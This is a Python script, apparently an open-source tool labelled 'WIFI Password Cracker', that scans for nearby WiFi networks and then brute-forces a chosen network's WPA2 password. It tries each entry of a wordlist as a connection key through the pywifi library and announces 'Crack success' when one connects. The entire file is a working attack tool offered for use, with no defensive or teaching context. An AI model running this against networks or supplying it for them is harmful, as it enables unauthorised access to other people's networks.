# WiFi Scanner by Brahim Jarrar
# GitHub: https://github.com/BrahimJarrar/
# © 2019

import argparse
import os
import platform
import time
from colorama import Fore, Style
from pywifi import PyWiFi, const, Profile
from bfw_windows import get_SSIDS


try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    results = ifaces.scan_results()
    iface = wifi.interfaces()[0]
except Exception as e:
    print(f"{Fore.RED}[-] Error: {e}")
    exit()

def main(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(f"{Style.BRIGHT}{Fore.GREEN}[*] Crack success!")
        print(f"[*] Password is {password}{Style.RESET_ALL}")
        time.sleep(1)
        exit()
    else:
        print(f"{Fore.RED}[{number}] Crack Failed using {password}")

def pwd(ssid, file):
    number = 0
    with open(os.path.abspath(f"words_lists/{file}.txt"), "r") as words:
        for line in words:
            number += 1
            line = line.strip()
            main(ssid, line, number)

def menu():
    parser = argparse.ArgumentParser(description='WIFI Password Cracker')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Keywords list...')
    group1 = parser.add_mutually_exclusive_group()
    group1.add_argument('-v', '--version', action='store_true', help='Version Information')
    args = parser.parse_args()

    print(f"{Fore.CYAN}[+] You are using {Style.BRIGHT}{platform.system()}, {platform.machine()}...")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        file = args.wordlist
    elif args.version:
        print(f"\n\n{Fore.CYAN}by Brahim Jarrar\n")
        print(f"{Fore.RED}github", f"{Fore.BLUE}: https://github.com/BrahimJarrar/\n")
        print(f"{Fore.GREEN}CopyRight 2019\n\n")
        exit()
    else:
        print(f"{Fore.BLUE}")
        ssid = input("[*] SSID: ")
        file = input("[*] Passwords file: ")

    if os.path.exists(os.path.abspath(f"words_lists/{file}.txt")):
        os.system("cls" if platform.system().startswith("Win" or "win") else "clear")
        print(f"{Fore.BLUE}[~] Cracking...")
        pwd(ssid, file)
    else:
        print(f"{Fore.RED}[-] No Such File.{Fore.BLUE}")



if __name__ == "__main__":
    SSIDs = get_SSIDS()
    num_networks = len(SSIDs)

    print()
    print(
        Fore.RED + "No networks available" + Style.RESET_ALL if num_networks == 0
        else Fore.CYAN + f"There is 1 network available" + Style.RESET_ALL if num_networks == 1
        else Fore.CYAN + f"There are {num_networks} networks available" + Style.RESET_ALL
    )

    print(f"{Fore.RED}Here is the list of all SSIDs found{Fore.RESET}")
    for ssid in SSIDs:
        print(f"{Fore.LIGHTYELLOW_EX}{ssid}{Fore.RESET}")

    # start the attack
    menu()